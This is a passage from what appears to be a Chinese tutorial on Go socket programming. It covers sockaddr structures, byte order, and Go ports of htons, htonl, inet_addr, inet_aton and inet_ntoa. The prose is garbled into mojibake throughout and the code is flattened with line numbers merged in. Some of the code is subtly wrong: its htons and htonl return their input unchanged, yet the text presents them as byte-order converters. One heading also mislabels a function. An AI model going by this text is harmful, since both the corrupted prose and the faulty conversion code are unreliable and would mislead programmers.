ç±»å‹ï¼Œè¿™æ˜¯ä¸€ä¸ªæ¥å£ç±»å‹ï¼Œå®ƒå®šä¹‰äº†ä¸€äº›æ–¹æ³•ï¼Œè¿™äº›æ–¹æ³•éœ€è¦ç”±ä»»ä½•å®ç°è¯¥æ¥å£çš„ç±»å‹æ¥å®ç°ã€‚\nSockaddrInet4Â å’ŒÂ SockaddrInet6Â ç»“æ„ä½“éƒ½å®ç°äº†Â SockaddrÂ æ¥å£ï¼Œå› æ­¤å®ƒä»¬å¯ä»¥ä½œä¸ºÂ syscall.BindÂ å‡½æ•°çš„å‚æ•°ã€‚\nå½“ä½ åˆ›å»ºä¸€ä¸ªÂ SockaddrInet4Â ç»“æ„ä½“å¹¶ä¼ é€’ç»™Â syscall.BindÂ å‡½æ•°æ—¶ï¼ŒGo è¯­è¨€ä¼šè‡ªåŠ¨å°†Â SockaddrInet4Â ç»“æ„ä½“è½¬æ¢ä¸ºÂ SockaddrÂ æ¥å£ç±»å‹ï¼Œç„¶åå†ä¼ é€’ç»™Â syscall.BindÂ å‡½æ•°ã€‚\næ‰€ä»¥ï¼Œè™½ç„¶Â syscall.BindÂ å‡½æ•°çš„å‚æ•°ç±»å‹æ˜¯Â Sockaddrï¼Œä½†ä½ å¯ä»¥ä¼ é€’ä¸€ä¸ªÂ *SockaddrInet4Â æˆ–Â *SockaddrInet6Â ç»“æ„ä½“ç»™å®ƒã€‚\nLenï¼šä¸€ä¸ªÂ uint8Â ç±»å‹çš„å€¼ï¼Œè¡¨ç¤ºæ­¤ç»“æ„ä½“çš„é•¿åº¦ã€‚\nFamilyï¼šä¸€ä¸ªÂ uint8Â ç±»å‹çš„å€¼ï¼Œè¡¨ç¤ºåœ°å€æ—ã€‚å¯¹äº IPv4ï¼Œæ­¤å€¼é€šå¸¸ä¸ºÂ AF_INETã€‚\nFamilyÂ å­—æ®µåœ¨Â RawSockaddrInet4Â ç»“æ„ä½“ä¸­ç”¨äºæŒ‡å®šåœ°å€æ—ã€‚å¯¹äº IPv4 åœ°å€ï¼Œè¿™ä¸ªå­—æ®µé€šå¸¸è¢«è®¾ç½®ä¸ºÂ AF_INETã€‚ è™½ç„¶Â RawSockaddrInet4Â ç»“æ„ä½“é€šå¸¸ç”¨äºè¡¨ç¤º IPv4 åœ°å€ï¼Œä½†Â FamilyÂ å­—æ®µä»ç„¶æ˜¯å¿…è¦çš„ï¼Œå› ä¸ºå®ƒå‘Šè¯‰æ“ä½œç³»ç»Ÿå¦‚ä½•è§£é‡Šè¿™ä¸ªç»“æ„ä½“ä¸­çš„å…¶ä»–å­—æ®µã€‚ä¾‹å¦‚ï¼ŒPortÂ å’ŒÂ AddrÂ å­—æ®µçš„è§£é‡Šæ–¹å¼å–å†³äºÂ FamilyÂ å­—æ®µçš„å€¼ã€‚ æ­¤å¤–ï¼ŒFamilyÂ å­—æ®µä¹Ÿå¯ä»¥å¸®åŠ©è°ƒè¯•å’Œé”™è¯¯æ£€æŸ¥ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä½ çœ‹åˆ°ä¸€ä¸ªÂ FamilyÂ å­—æ®µçš„å€¼ä¸æ˜¯Â AF_INETï¼Œä½†ç»“æ„ä½“æ˜¯Â RawSockaddrInet4ï¼Œé‚£ä¹ˆä½ å°±çŸ¥é“æœ‰äº›åœ°æ–¹å‡ºé”™äº†ã€‚\nPortï¼šä¸€ä¸ªÂ uint16Â ç±»å‹çš„å€¼ï¼Œè¡¨ç¤ºç½‘ç»œåœ°å€çš„ç«¯å£å·ã€‚æ³¨æ„ï¼Œè¿™ä¸ªå€¼æ˜¯ç½‘ç»œå­—èŠ‚åºã€‚\nAddrï¼šä¸€ä¸ªÂ [4]byteÂ ç±»å‹çš„æ•°ç»„ï¼Œè¡¨ç¤º IPv4 åœ°å€ã€‚æ¯ä¸ªå­—èŠ‚ä»£è¡¨åœ°å€çš„ä¸€éƒ¨åˆ†ï¼Œä¾‹å¦‚ï¼Œåœ°å€ \u0026ldquo;127.0.0.1\u0026rdquo; ä¼šè¢«è¡¨ç¤ºä¸ºÂ [127, 0, 0, 1]ã€‚\nZeroï¼šä¸€ä¸ªÂ [8]int8Â ç±»å‹çš„æ•°ç»„ï¼Œç”¨äºå¡«å……ï¼Œä»¥ç¡®ä¿ç»“æ„ä½“çš„å¤§å°æ­£ç¡®ã€‚è¿™ä¸ªå­—æ®µé€šå¸¸ä¸ç”¨äºå¸¸è§„ç¼–ç¨‹ã€‚ï¼ˆç±»ä¼¼sin_zeroï¼‰\nSockaddrInet4 å’Œ RawSockaddrInet4 ä¸¤ä¸ªç»“æ„ä½“éƒ½åŒ…å« Port å’Œ Addr å­—æ®µï¼Œä½†å®ƒä»¬çš„ç”¨é€”æ˜¯ä¸åŒçš„ã€‚\nSockaddrInet4 æ˜¯ Go è¯­è¨€å¯¹ç½‘ç»œåœ°å€çš„é«˜çº§è¡¨ç¤ºï¼Œå®ƒçš„ Port å’Œ Addr å­—æ®µç±»å‹åˆ†åˆ«ä¸º int å’Œ [4]byteï¼Œè¿™å¯¹äº Go ç¨‹åºå‘˜æ¥è¯´æ›´æ˜“äºä½¿ç”¨ã€‚\nè€Œ RawSockaddrInet4 æ˜¯å¯¹ç³»ç»Ÿè°ƒç”¨çº§åˆ«çš„ç½‘ç»œåœ°å€çš„ä½çº§è¡¨ç¤ºï¼Œå®ƒçš„ Port å’Œ Addr å­—æ®µç±»å‹åˆ†åˆ«ä¸º uint16 å’Œ [4]byteï¼Œå¹¶ä¸” Port å­—æ®µæ˜¯ç½‘ç»œå­—èŠ‚åºï¼Œè¿™å¯¹äºç³»ç»Ÿè°ƒç”¨æ¥è¯´æ˜¯å¿…é¡»çš„ã€‚\nå½“ä½ åœ¨ Go ä»£ç ä¸­åˆ›å»ºä¸€ä¸ª SockaddrInet4 ç»“æ„ä½“å¹¶ä¼ é€’ç»™å¦‚ syscall.Bind è¿™æ ·çš„å‡½æ•°æ—¶ï¼ŒGo è¯­è¨€ä¼šè‡ªåŠ¨å°† SockaddrInet4 ç»“æ„ä½“è½¬æ¢ä¸º RawSockaddrInet4 ç»“æ„ä½“ï¼Œç„¶åå†ä¼ é€’ç»™åº•å±‚çš„ç³»ç»Ÿè°ƒç”¨ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆ SockaddrInet4 ç»“æ„ä½“ä¸­åŒ…å«ä¸€ä¸ª RawSockaddrInet4 å­—æ®µçš„åŸå› ã€‚\nSockaddrInet4ç»“æ„ä½“åŒ…å«äº†IPv4åœ°å€å’Œç«¯å£ä¿¡æ¯ï¼Œè€ŒRawSockaddrInet4ç»“æ„ä½“åˆ™æ˜¯ä¸ºäº†åœ¨åº•å±‚ç½‘ç»œç¼–ç¨‹ä¸­ä½¿ç”¨åŸå§‹çš„å¥—æ¥å­—åœ°å€ç»“æ„è€Œå®šä¹‰çš„ã€‚è¿™ç§è®¾è®¡å¯ä»¥è®©ç½‘ç»œç¼–ç¨‹åœ¨ä¸åŒå±‚æ¬¡ä¸Šè¿›è¡Œæ“ä½œï¼ŒåŒæ—¶ä¿æŒçµæ´»æ€§å’Œå¯æ‰©å±•æ€§ã€‚\n3.3 ç½‘ç»œå­—èŠ‚åºä¸åœ°å€å˜æ¢ ä¸åŒCPUä¸­,4å­—èŠ‚æ•´æ•°å‹å€¼1åœ¨å†…å­˜ç©ºé—´çš„ä¿å­˜æ–¹å¼æ˜¯ä¸åŒçš„ã€‚4å­—èŠ‚æ•´æ•°å‹å€¼1å¯ç”¨2è¿›åˆ¶è¡¨ç¤ºå¦‚ä¸‹ã€‚ 00000000 00000000 00000000 00000001 æœ‰äº›CPUä»¥è¿™ç§é¡ºåºä¿å­˜åˆ°å†…å­˜,å¦å¤–ä¸€äº›CPUåˆ™ä»¥å€’åºä¿å­˜ã€‚ 00000001 00000000 00000000 00000000 è‹¥ä¸è€ƒè™‘è¿™äº›å°±æ”¶å‘æ•°æ®åˆ™ä¼šå‘ç”Ÿé—®é¢˜,å› ä¸ºä¿å­˜é¡ºåºçš„ä¸åŒæ„å‘³ç€å¯¹æ¥æ”¶æ•°æ®çš„è§£æé¡ºåºä¹Ÿä¸åŒã€‚\nå­—èŠ‚åºä¸ç½‘ç»œå­—èŠ‚åº CPUå‘å†…å­˜ä¿å­˜æ•°æ®çš„æ–¹å¼æœ‰2ç§,è¿™æ„å‘³ç€CPUè§£ææ•°æ®çš„æ–¹å¼ä¹Ÿåˆ†ä¸º2ç§ã€‚\nå¤§ç«¯åº(Big Endian):é«˜ä½å­—èŠ‚å­˜æ”¾åˆ°ä½ä½åœ°å€ã€‚ å°ç«¯åº(Little Endian):é«˜ä½å­—èŠ‚å­˜æ”¾åˆ°é«˜ä½åœ°å€ã€‚ æ¯ç§CPUçš„æ•°æ®ä¿å­˜æ–¹å¼å‡ä¸åŒã€‚å› æ­¤, ä»£è¡¨CPUæ•°æ®ä¿å­˜æ–¹å¼çš„ä¸»æœºå­—èŠ‚åº(Host Byte Order)åœ¨ä¸åŒCPUä¸­ä¹Ÿå„ä¸ç›¸åŒã€‚ç›®å‰ä¸»æµçš„Intelç³»åˆ—CPUä»¥å°ç«¯åºæ–¹å¼ä¿å­˜æ•°æ®ã€‚æ¥ä¸‹æ¥åˆ†æ2å°å­—èŠ‚åºä¸åŒçš„è®¡ç®—æœºä¹‹é—´æ•°æ®ä¼ é€’è¿‡ç¨‹ä¸­å¯èƒ½å‡ºç°çš„é—®é¢˜ 0x12å’Œ0x34æ„æˆçš„å¤§ç«¯åºç³»ç»Ÿå€¼ä¸0x34å’Œ0x12æ„æˆçš„å°ç«¯åºç³»ç»Ÿå€¼ç›¸åŒã€‚æ¢è¨€ä¹‹,åªæœ‰æ”¹å˜æ•°æ®ä¿å­˜é¡ºåºæ‰èƒ½è¢«è¯†åˆ«ä¸ºåŒä¸€å€¼ã€‚å›¾3-6ä¸­,å¤§ç«¯åºç³»ç»Ÿä¼ è¾“æ•°æ®0x1234æ—¶æœªè€ƒè™‘å­—èŠ‚åºé—®é¢˜, è€Œç›´æ¥ä»¥Ox12ã€0x34çš„é¡ºåºå‘é€ã€‚ç»“æœæ¥æ”¶ç«¯ä»¥å°ç«¯åºæ–¹å¼ä¿å­˜æ•°æ®,å› æ­¤å°ç«¯åºæ¥æ”¶çš„æ•°æ®å˜æˆ0x3412,è€Œé0x1234ã€‚æ­£å› å¦‚æ­¤,åœ¨é€šè¿‡ç½‘ç»œä¼ è¾“æ•°æ®æ—¶çº¦å®šç»Ÿä¸€æ–¹å¼,è¿™ç§çº¦å®šç§°ä¸ºç½‘ç»œå­—èŠ‚åº(Network Byte Order) éå¸¸ç®€å•ï¼šç»Ÿä¸€ä¸ºå¤§ç«¯åºã€‚ å³,å…ˆæŠŠæ•°æ®æ•°ç»„è½¬åŒ–æˆå¤§ç«¯åºæ ¼å¼å†è¿›è¡Œç½‘ç»œä¼ è¾“ã€‚å› æ­¤,æ‰€æœ‰è®¡ç®—æœºæ¥æ”¶æ•°æ®æ—¶åº”è¯†åˆ«è¯¥æ•°æ®æ˜¯ç½‘ç»œå­—èŠ‚åºæ ¼å¼,å°ç«¯åºç³»ç»Ÿä¼ è¾“æ•°æ®æ—¶åº”è½¬åŒ–ä¸ºå¤§ç«¯åºæ’åˆ—æ–¹å¼ã€‚ å­—èŠ‚åºè½¬æ¢ æ¥ä¸‹æ¥ä»‹ç»å¸®åŠ©è½¬æ¢å­—èŠ‚åºçš„å‡½æ•°ã€‚è¿™æ˜¯æ–‡ä¸­ç»™çš„cè¯­è¨€è½¬æ¢å‡½æ•° åœ¨ Go è¯­è¨€ä¸­ï¼Œæ²¡æœ‰å†…ç½®çš„Â htonsï¼ˆHost TO Network Shortï¼‰ã€ntohsï¼ˆNetwork TO Host Shortï¼‰ã€htonlï¼ˆHost TO Network Longï¼‰å’ŒÂ ntohlï¼ˆNetwork TO Host Longï¼‰å‡½æ•°ã€‚è¿™äº›å‡½æ•°åœ¨ C è¯­è¨€ä¸­ç”¨äºåœ¨ä¸»æœºå­—èŠ‚åºå’Œç½‘ç»œå­—èŠ‚åºä¹‹é—´è½¬æ¢æ•°æ®ã€‚\nä½†æ˜¯ï¼Œä½ å¯ä»¥ä½¿ç”¨ Go è¯­è¨€çš„Â encoding/binaryÂ åŒ…æ¥å®ç°åŒæ ·çš„åŠŸèƒ½ã€‚ä»¥ä¸‹æ˜¯å¦‚ä½•åœ¨ Go è¯­è¨€ä¸­å®ç°è¿™äº›å‡½æ•°çš„ä¾‹å­ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 package main import ( \u0026#34;encoding/binary\u0026#34; \u0026#34;fmt\u0026#34; ) func htons(n uint16) uint16 { var b [2]byte binary.BigEndian.PutUint16(b[:], n) return binary.BigEndian.Uint16(b[:]) } func ntohs(n uint16) uint16 { return htons(n) // åœ¨ 16 ä½æ— ç¬¦å·æ•´æ•°ä¸Šï¼Œntohs å’Œ htons æ˜¯ç›¸åŒçš„ } func htonl(n uint32) uint32 { var b [4]byte binary.BigEndian.PutUint32(b[:], n) return binary.BigEndian.Uint32(b[:]) } func ntohl(n uint32) uint32 { return htonl(n) // åœ¨ 32 ä½æ— ç¬¦å·æ•´æ•°ä¸Šï¼Œntohl å’Œ htonl æ˜¯ç›¸åŒçš„ } func main() { fmt.Println(htons(12345)) // è¾“å‡ºï¼š12345 fmt.Println(ntohs(12345)) // è¾“å‡ºï¼š12345 fmt.Println(htonl(12345)) // è¾“å‡ºï¼š12345 fmt.Println(ntohl(12345)) // è¾“å‡ºï¼š12345 } endian_conv.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 package main import ( \u0026#34;encoding/binary\u0026#34; \u0026#34;fmt\u0026#34; ) // htons å‡½æ•°æ¥æ”¶ä¸€ä¸ª uint16 ç±»å‹çš„ä¸»æœºå­—èŠ‚åºå€¼ï¼Œ // å°†å…¶è½¬æ¢ä¸ºç½‘ç»œå­—èŠ‚åºï¼Œç„¶åè¿”å›è½¬æ¢åçš„å€¼ã€‚ func htons(n uint16) uint16 { b := make([]byte, 2) // åˆ›å»ºä¸€ä¸ªé•¿åº¦ä¸º 2 çš„å­—èŠ‚æ•°ç»„ binary.BigEndian.PutUint16(b, n) // å°† n çš„å€¼ä»¥å¤§ç«¯å­—èŠ‚åºæ”¾å…¥å­—èŠ‚æ•°ç»„ return binary.BigEndian.Uint16(b) // ä»å­—èŠ‚æ•°ç»„ä¸­è¯»å–å¹¶è¿”å›å¤§ç«¯å­—èŠ‚åºçš„å€¼ } // htonl å‡½æ•°æ¥æ”¶ä¸€ä¸ª uint32 ç±»å‹çš„ä¸»æœºå­—èŠ‚åºå€¼ï¼Œ // å°†å…¶è½¬æ¢ä¸ºç½‘ç»œå­—èŠ‚åºï¼Œç„¶åè¿”å›è½¬æ¢åçš„å€¼ã€‚ func htonl(n uint32) uint32 { b := make([]byte, 4) // åˆ›å»ºä¸€ä¸ªé•¿åº¦ä¸º 4 çš„å­—èŠ‚æ•°ç»„ binary.BigEndian.PutUint32(b, n) // å°† n çš„å€¼ä»¥å¤§ç«¯å­—èŠ‚åºæ”¾å…¥å­—èŠ‚æ•°ç»„ return binary.BigEndian.Uint32(b) // ä»å­—èŠ‚æ•°ç»„ä¸­è¯»å–å¹¶è¿”å›å¤§ç«¯å­—èŠ‚åºçš„å€¼ } func main() { hostPort := uint16(0x1234) // å®šä¹‰ä¸€ä¸ªä¸»æœºå­—èŠ‚åºçš„ç«¯å£å€¼ hostAddr := uint32(0x12345678) // å®šä¹‰ä¸€ä¸ªä¸»æœºå­—èŠ‚åºçš„åœ°å€å€¼ netPort := htons(hostPort) // å°†ä¸»æœºå­—èŠ‚åºçš„ç«¯å£å€¼è½¬æ¢ä¸ºç½‘ç»œå­—èŠ‚åº netAddr := htonl(hostAddr) // å°†ä¸»æœºå­—èŠ‚åºçš„åœ°å€å€¼è½¬æ¢ä¸ºç½‘ç»œå­—èŠ‚åº 3.4 ç½‘ç»œåœ°å€çš„åˆå§‹åŒ–ä¸åˆ†é… å°†å­—ç¬¦ä¸²ä¿¡æ¯è½¬æ¢ä¸ºç½‘ç»œå­—èŠ‚åºçš„æ•´æ•°å‹ sockaddr_inä¸­ä¿å­˜åœ°å€ä¿¡æ¯çš„æˆå‘˜ä¸º32ä½æ•´æ•°å‹ã€‚å› æ­¤,ä¸ºäº†åˆ†é…IPåœ°å€,éœ€è¦å°†å…¶è¡¨ç¤ºä¸º32ä½æ•´æ•°å‹æ•°æ®ã€‚è¿™å¯¹äºåªç†Ÿæ‚‰å­—ç¬¦ä¸²ä¿¡æ¯çš„æˆ‘ä»¬æ¥è¯´å®éæ˜“äº‹ã€‚\nå¯¹äºIPåœ°å€çš„è¡¨ç¤º,æˆ‘ä»¬ç†Ÿæ‚‰çš„æ˜¯ç‚¹åˆ†åè¿›åˆ¶è¡¨ç¤ºæ³•(Dotted Decimal Notation),è€Œéæ•´æ•°å‹æ•°æ®è¡¨ç¤ºæ³•ã€‚å¹¸è¿çš„æ˜¯,æœ‰ä¸ªå‡½æ•°ä¼šå¸®æˆ‘ä»¬å°†å­—ç¬¦ä¸²å½¢å¼çš„IPåœ°å€è½¬æ¢æˆ32ä½æ•´æ•°å‹æ•°æ®ã€‚æ­¤å‡½æ•°åœ¨è½¬æ¢ç±»å‹çš„åŒæ—¶è¿›è¡Œç½‘ç»œå­—èŠ‚åºè½¬æ¢ã€‚\ninet_addr 1 2 3 #include \u0026lt;arpa/inet.h\u0026gt; in_addr_t inet_addr(const char * string); //æˆåŠŸæ—¶è¿”å›32ä½å¤§ç«¯åºæ•´æ•°å‹å€¼,å¤±è´¥æ—¶è¿”å› INADDR_NONEã€‚ å¦‚æœå‘è¯¥å‡½æ•°ä¼ é€’ç±»ä¼¼â€œ211.214.107.99â€çš„ç‚¹åˆ†åè¿›åˆ¶æ ¼å¼çš„å­—ç¬¦ä¸²,å®ƒä¼šå°†å…¶è½¬æ¢ä¸º32 ä½æ•´æ•°å‹æ•°æ®å¹¶è¿”å›ã€‚å½“ç„¶,è¯¥æ•´æ•°å‹å€¼æ»¡è¶³ç½‘ç»œå­—èŠ‚åºã€‚å¦å¤–,è¯¥å‡½æ•°çš„è¿”å›å€¼ç±»å‹in_addr_t åœ¨å†…éƒ¨å£°æ˜ä¸º32ä½æ•´æ•°å‹ã€‚\nåœ¨ Go ä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨Â netÂ åŒ…çš„Â ParseIPÂ å‡½æ•°æ¥è§£æ IP åœ°å€ã€‚è¿™ä¸ªå‡½æ•°å¯ä»¥å¤„ç† IPv4 å’Œ IPv6 åœ°å€ï¼Œå¦‚æœè¾“å…¥çš„å­—ç¬¦ä¸²ä¸æ˜¯æœ‰æ•ˆçš„ IP åœ°å€ï¼Œå®ƒä¼šè¿”å›Â nilã€‚ç„¶åï¼Œä½ å¯ä»¥ä½¿ç”¨Â encoding/binaryÂ åŒ…çš„Â BigEndian.Uint32Â æˆ–Â LittleEndian.Uint32Â å‡½æ•°å°†Â net.IPÂ ç±»å‹çš„ IP åœ°å€è½¬æ¢ä¸ºç½‘ç»œå­—èŠ‚åºæˆ–ä¸»æœºå­—èŠ‚åºçš„æ•´æ•°ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 package main import ( \u0026#34;encoding/binary\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;net\u0026#34; ) func main() { ip := net.ParseIP(\u0026#34;1.2.3.4\u0026#34;) if ip == nil { fmt.Println(\u0026#34;Invalid IP address\u0026#34;) return } ip = ip.To4() if ip == nil { fmt.Println(\u0026#34;Not an IPv4 address\u0026#34;) return } fmt.Printf(\u0026#34;IP as integer (network byte order): %x\\n\u0026#34;, binary.BigEndian.Uint32(ip)) fmt.Printf(\u0026#34;IP as integer (host byte order): %x\\n\u0026#34;, binary.LittleEndian.Uint32(ip)) } inter_addr.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 package main import ( \u0026#34;encoding/binary\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;net\u0026#34; ) const INADDR_NONE = 0xffffffff // inet_addr converts an IPv4 address in dot-decimal notation into a 32-bit integer in network byte order. // If the IP address is invalid, it returns INADDR_NONE (0xffffffff). func inet_addr(ipStr string) uint32 { ip := net.ParseIP(ipStr) if ip == nil { return 0xffffffff } ip = ip.To4() if ip == nil { return 0xffffffff } return binary.BigEndian.Uint32(ip) } func main() { addr1 := \u0026#34;1.2.3.4\u0026#34; addr2 := \u0026#34;1.2.3.256\u0026#34; conv_addr := inet_addr(addr1) if conv_addr == INADDR_NONE { fmt.Println(\u0026#34;Error occured!\u0026#34;) } else { fmt.Printf(\u0026#34;Network ordered integer addr: %#x\\n\u0026#34;, conv_addr) } conv_addr = inet_addr(addr2) if conv_addr == INADDR_NONE { fmt.Println(\u0026#34;Error occured!\u0026#34;) } else { fmt.Printf(\u0026#34;Network ordered integer addr: %#x\\n\u0026#34;, conv_addr) } } inet_aton inet_atonå‡½æ•° ä¸inet_addrå‡½æ•°åœ¨åŠŸèƒ½ä¸Šå®Œå…¨ç›¸åŒ,ä¹Ÿå°†å­—ç¬¦ä¸²å½¢å¼IPåœ°å€è½¬æ¢ä¸º32ä½ç½‘ç»œå­—èŠ‚åºæ•´æ•°å¹¶è¿”å›ã€‚åªä¸è¿‡è¯¥å‡½æ•°åˆ©ç”¨äº†in_addrç»“æ„ä½“,ä¸”å…¶ä½¿ç”¨é¢‘ç‡æ›´é«˜ã€‚\n1 2 3 4 5 #include \u0026lt;arpa/inet.h\u0026gt; int inet_aton(const char * string,struct in_addn * addn); //æˆåŠŸæ—¶è¿”å›1(true),å¤±è´¥æ—¶è¿”å› 0(false)ã€‚ //string å«æœ‰éœ€è½¬æ¢çš„IPåœ°å€ä¿¡æ¯çš„å­—ç¬¦ä¸²åœ°å€å€¼ã€‚ //addr å°†ä¿å­˜è½¬æ¢ç»“æœçš„in_addrç»“æ„ä½“å˜é‡çš„åœ°å€å€¼ã€‚ inet_aton.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 package main import ( \u0026#34;encoding/binary\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net\u0026#34; ) // inet_aton converts an IPv4 address in dot-decimal notation into a 32-bit integer in network byte order. // If the IP address is valid, it stores the result in the given *uint32 and returns true. // If the IP address is invalid, it returns false. func inet_aton(ipStr string, ip *uint32) bool { parsedIP := net.ParseIP(ipStr) if parsedIP == nil { return false } parsedIP = parsedIP.To4() if parsedIP == nil { return false } *ip = binary.BigEndian.Uint32(parsedIP) return true } func main() { addr := \u0026#34;127.232.124.79\u0026#34; var ip uint32 if !inet_aton(addr, \u0026amp;ip) { log.Fatalln(\u0026#34;Conversion error\u0026#34;) } else { fmt.Printf(\u0026#34;Network ordered integer addr: %#x\\n\u0026#34;, ip) } } inet_aton ä¸Šè¿°è¿è¡Œç»“æœæ— å…³ç´§è¦,æ›´é‡è¦çš„æ˜¯å¤§å®¶è¦ç†Ÿç»ƒæŒæ¡è¯¥å‡½æ•°çš„è°ƒç”¨æ–¹æ³•ã€‚æœ€åå†ä»‹ç»ä¸€ä¸ªä¸inet_atonå‡½æ•°æ­£å¥½ç›¸åçš„å‡½æ•°,æ­¤å‡½æ•°å¯ä»¥æŠŠç½‘ç»œå­—èŠ‚åºæ•´æ•°å‹IPåœ°å€è½¬æ¢æˆæˆ‘ä»¬ç†Ÿæ‚‰çš„å­—ç¬¦ä¸²å½¢å¼ã€‚\n1 2 3 #include \u0026lt;arpa/inet.h\u0026gt; char * inet_ntoa(struct in_addr adr); //æˆåŠŸæ—¶è¿”å›è½¬æ¢çš„å­—ç¬¦ä¸²åœ°å€å€¼,å¤±è´¥æ—¶è¿”å›-1ã€‚ è¯¥å‡½æ•°å°†é€šè¿‡å‚æ•°ä¼ å…¥çš„æ•´æ•°å‹IPåœ°å€è½¬æ¢ä¸ºå­—ç¬¦ä¸²æ ¼å¼å¹¶è¿”å›ã€‚ ä½†è°ƒç”¨æ—¶éœ€å°å¿ƒ,è¿”å›å€¼ç±»å‹ä¸ºcharæŒ‡é’ˆã€‚è¿”å›å­—ç¬¦ä¸²åœ°å€æ„å‘³ç€å­—ç¬¦ä¸²å·²ä¿å­˜åˆ°å†…å­˜ç©ºé—´,ä½†è¯¥å‡½æ•°æœªå‘ç¨‹åºå‘˜è¦æ±‚åˆ†é…å†…å­˜,è€Œæ˜¯åœ¨å†…éƒ¨ç”³è¯·äº†å†…å­˜å¹¶ä¿å­˜äº†å­—ç¬¦ä¸²ã€‚ä¹Ÿå°±æ˜¯è¯´,è°ƒç”¨å®Œè¯¥å‡½æ•°å,åº”ç«‹å³å°†å­—ç¬¦ä¸²ä¿¡æ¯å¤åˆ¶åˆ°å…¶ä»–å†…å­˜ç©ºé—´ã€‚æ€»ä¹‹,å†æ¬¡è°ƒç”¨inet_ntoaå‡½æ•°å‰è¿”å›çš„å­—ç¬¦ä¸²åœ°å€å€¼æ˜¯æœ‰æ•ˆçš„ã€‚è‹¥éœ€è¦é•¿æœŸä¿å­˜,åˆ™åº”å°†å­—ç¬¦ä¸²å¤åˆ¶åˆ°å…¶ä»–å†…å­˜ç©ºé—´ã€‚\nGoè¯­è¨€æ ‡å‡†åº“ä¸­å¹¶æ²¡æœ‰ç›´æ¥æä¾›å¯¹Cè¯­è¨€ä¸­çš„ç½‘ç»œåœ°å€è½¬æ¢å‡½æ•°çš„å°è£…ã€‚å¦‚æœè¦åœ¨Goä¸­å®ç°ç±»ä¼¼çš„åŠŸèƒ½ï¼Œå¯ä»¥ä½¿ç”¨netåŒ…ä¸­çš„IPå’ŒIPv4ç±»æ¥è¿›è¡ŒIPåœ°å€çš„è½¬æ¢å’Œæ“ä½œã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„ç¤ºä¾‹ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;net\u0026#34; ) func main1() { var addr1, addr2 uint32 = 0x1020304, 0x1010101 ip1 := net.IPv4(byte(addr1\u0026gt;\u0026gt;24), byte(addr1\u0026gt;\u0026gt;16), byte(addr1\u0026gt;\u0026gt;8), byte(addr1)) ip2 := net.IPv4(byte(addr2\u0026gt;\u0026gt;24), byte(addr2\u0026gt;\u0026gt;16), byte(addr2\u0026gt;\u0026gt;8), byte(addr2)) fmt.Printf(\u0026#34;Dotted-Decimal notation1: %s \\n\u0026#34;, ip1.String()) fmt.Printf(\u0026#34;Dotted-Decimal notation2: %s \\n\u0026#34;, ip2.String()) } ç”¨goè‡ªè¡Œå†™çš„ inet_atonå‡½æ•°\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;net\u0026#34; ) // inet_ntoa converts a 32-bit integer in network byte order into a dotted-decimal IP address. func inet_ntoa(ipInt uint32) string { ipBytes := make([]byte, 4) ipBytes[0] = byte(ipInt \u0026gt;\u0026gt; 24) ipBytes[1] = byte(ipInt \u0026gt;\u0026gt; 16) ipBytes[2] = byte(ipInt \u0026gt;\u0026gt; 8) ipBytes[3] = byte(ipInt) return net.IP(ipBytes).String() } func main() { var addr1, addr2 uint32 = 0x1020304, 0x1010101 fmt.Printf(\u0026#34;Dotted-Decimal notation1: %s \\n\u0026#34;, inet_ntoa(addr1)) fmt.Printf(\u0026#34;Dotted-Decimal notation2: %s \\n\u0026#34;, inet_ntoa(addr2)) } ç½‘ç»œåœ°å€åˆå§‹åŒ– ä¸Šè¿°ä»£ç ä¸­,memsetå‡½æ•°å°†æ¯ä¸ªå­—èŠ‚åˆå§‹åŒ–ä¸ºåŒä¸€å€¼:ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºç»“æ„ä½“å˜é‡addrçš„åœ°å€å€¼,å³åˆå§‹åŒ–å¯¹è±¡ä¸ºaddr;ç¬¬äºŒä¸ªå‚æ•°ä¸º0,å› æ­¤åˆå§‹åŒ–ä¸º0;æœ€åä¸€ä¸ªå‚æ•°ä¸­ä¼ å…¥addrçš„é•¿åº¦,å› æ­¤addrçš„æ‰€æœ‰å­—èŠ‚å‡åˆå§‹åŒ–ä¸º0ã€‚è¿™ä¹ˆåšæ˜¯ä¸ºäº†å°†sockaddr_inç»“æ„ä½“çš„æˆå‘˜sin_zeroåˆå§‹åŒ–ä¸º0ã€‚ å¦å¤–,æœ€åä¸€è¡Œä»£ç è°ƒç”¨çš„atoiå‡½æ•°æŠŠå­—ç¬¦ä¸²ç±»å‹çš„å€¼è½¬æ¢æˆæ•´æ•°å‹ã€‚æ€»ä¹‹,ä¸Šè¿°ä»£ç åˆ©ç”¨å­—ç¬¦ä¸²æ ¼å¼çš„IPåœ°å€å’Œç«¯å£å·åˆå§‹åŒ–äº†sockaddr_inç»“æ„ä½“å˜é‡ã€‚ å¦å¤–,ä»£ç ä¸­å¯¹IPåœ°å€å’Œç«¯å£å·è¿›è¡Œäº†ç¡¬ç¼–ç ,è¿™å¹¶éè‰¯ç­–,å› ä¸ºè¿è¡Œç¯å¢ƒæ”¹å˜å°±å¾—æ›´æ”¹ä»£ç ã€‚å› æ­¤,æˆ‘ä»¬è¿è¡Œç¤ºä¾‹mainå‡½æ•°æ—¶ä¼ 